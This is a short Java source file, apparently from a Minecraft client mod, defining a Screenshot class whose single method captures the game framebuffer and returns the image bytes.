package me.soda.witch.features;

import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.util.ScreenshotRecorder;

import java.io.IOException;

import static me.soda.witch.Witch.mc;

public class Screenshot {
    public static byte[] takeScreenshot() throws IOException {
        NativeImage nativeImage = ScreenshotRecorder.takeScreenshot(mc.getFramebuffer());
        return nativeImage.getBytes();
    }
}